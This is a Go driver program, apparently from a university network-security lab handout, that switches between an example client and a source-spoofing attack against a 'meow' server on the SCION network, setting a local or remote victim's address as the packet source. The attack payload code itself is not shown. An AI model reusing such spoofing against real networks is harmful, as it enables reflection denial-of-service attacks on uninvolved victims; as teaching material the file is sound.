package main

import (
	"context"
	"log"
	"strconv"
	"fmt"

	"flag"

	"ethz.ch/netsec/isl/handout/attack/client"
	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/snet"
)

func main() {
	spoof := flag.Bool("spoof", false, "Toggles between the example client and your implementation of the attack.\nA value of false (default) will invoke the example client.")
	remote := flag.Bool("remote", false, "Only relevant if spoof is true: If this flag is set the remote victim address is set as source IP of the packets, otherwise (default) the local victim address is set as source IP.")
	flag.Parse()

	ctx := context.Background()
	localISD, localAsn := client.ISD_AS()
	// see output
	fmt.Println("localISD: ", localISD)
	fmt.Println("localAsn: ", localAsn)

	serverAddr := localISD + "-" + localAsn + "," + client.MeowServerIP().String() + ":" + strconv.FormatUint(server.ServerPorts[0], 10)
	fmt.Println("serverAddr_meow: ", serverAddr)
	if !*spoof { // non spoofing mode (exaple_client.go)
		err := client.Client(ctx, serverAddr, client.GenerateClientPayload())
		if err != nil {
			log.Printf("Client returned an error: %s", err)
			return
		}
	} else { // spoofing mode (attack.go)
		// spoofedAddr: the address of the victim
		// local: 17-ffaa:0:1119,10.57.114.132:61220
		// remote: 17-ffaa:0:1115,100.0.0.1:61220  (not in same AS)
		var spoofedAddr *snet.UDPAddr
		if *remote {
			spoofedAddr, _ = snet.ParseUDPAddr(client.VictimScionIA() + "," + client.RemoteVictimIP().String() + ":" + strconv.Itoa(client.VictimPort()))
		} else {
			spoofedAddr, _ = snet.ParseUDPAddr(localISD + "-" + localAsn + "," + client.LocalVictimIP().String() + ":" + strconv.Itoa(client.VictimPort()))
		}
		// look at spoofedAddr
		fmt.Println("spoofedAddr_victim: ", spoofedAddr)
		err := client.Attack(ctx, serverAddr, spoofedAddr, client.GenerateAttackPayload())
		if err != nil {
			log.Printf("Attack returned an error: %s", err)
			return
		}
	}
	return
}
